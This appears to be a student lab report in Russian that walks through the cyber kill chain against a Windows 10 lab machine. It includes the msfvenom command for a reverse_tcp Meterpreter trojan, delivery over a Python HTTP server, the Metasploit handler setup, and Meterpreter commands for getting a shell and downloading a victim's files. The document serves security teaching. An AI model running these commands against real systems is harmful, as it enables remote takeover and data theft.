# Лабораторная работа №6. Моделирование Kill-chain процедур 
## (Вариант 1)
## Теоретическая часть


## Практическая часть

### Этап 1: Разведка (Reconnaissance)

Цель этапа -  собрать информацию о целевой машине.

Скришнот с Windows

<img width="612" height="413" alt="image" src="https://github.com/user-attachments/assets/08195871-702a-4f3e-a8f8-e79a38aebbcf" />

Скриншот с Linux

<img width="1153" height="833" alt="image" src="https://github.com/user-attachments/assets/25451655-a92b-42e9-a150-8f73a3b539a4" />

### Этап 2: Создание «оружия» (Weaponization)

Цель этапа - создать вредоносную полезную нагрузку (payload).

1.	В Kali Linux откройте терминал.
2.	Используйте msfvenom для создания трояна: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-адрес Kali> LPORT=4444 -f exe > payload.exe
3.	-p windows/meterpreter/reverse_tcp: Выбираем полезную нагрузку (Meterpreter), которая установит обратное соединение с атакующим.
4.	LHOST: IP-адрес атакующей машины (Kali).
5.	LPORT: Порт, который будет слушать атакующая машина.
6.	-f exe: Формат файла — исполняемый EXE.
7.	> payload.exe: Сохранить в файл payload.exe.

### Этап 3: Доставка (Delivery)
Задача: Доставить payload.exe на целевую машину.
Практическое действие:
1.	Скопируйте файл payload.exe на целевую машину Windows 10. В лабораторных условиях можно просто скопировать через общую папку или загрузить по HTTP с простого питон-сервера на Kali (python3 -m http.server 80).
2.	Произведите доставку на целевую машину не вручную, а одним из эксплойтов из состава Metasploit.

Этап 4: Эксплуатация (Exploitation) и Этап 5: Установка (Installation)
Задача: Заставить жертву запустить файл и получить контроль над системой.
Практическое действие:
1.	Подготовка атакующего: Запустите msfconsole (фреймворк Metasploit) на Kali. Настройте обработчик (handler), который будет ждать соединение от полезной нагрузки:

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP-адрес Kali>
set LPORT 4444
exploit

2.	Действие жертвы: На целевой машине Windows 10 пользователь запускает payload.exe (имитируя неосторожность). Может появиться окно UAC (Контроль учетных записей) — это точка возможного срыва атаки!
3.	Результат: Если пользователь подтвердит запуск, в консоли Metasploit на Kali появится сессия Meterpreter. Этапы Exploitation и Installation пройдены — вредоносный код выполнился и установил себя в памяти.

Этап 6: Установление командования и управления (C2)
Задача: Убедиться, что связь установлена.
Практическое действие:
1.	В сессии Meterpreter выполните простые команды, например, sysinfo или getuid.
2.	Результат: Вы получите ответ от целевой машины. Это подтверждает, что канал C2 работает.

Этап 7: Действия по достижению цели (Actions on Objectives)
Задача: Продемонстрировать, что может сделать злоумышленник.
Практическое действие:
1.	В сессии Meterpreter выполните одну из команд:
	screenshot — сделать скриншот экрана жертвы.
	shell — получить командную строку Windows.
	upload /path/to/file C:\\temp\\ — загрузить файл на целевую машину.
	download C:\\secret.txt /tmp/ — скачать файл с целевой машины.
2.	Это наглядно демонстрирует финальную цель атаки — кражу данных или контроль над системой.


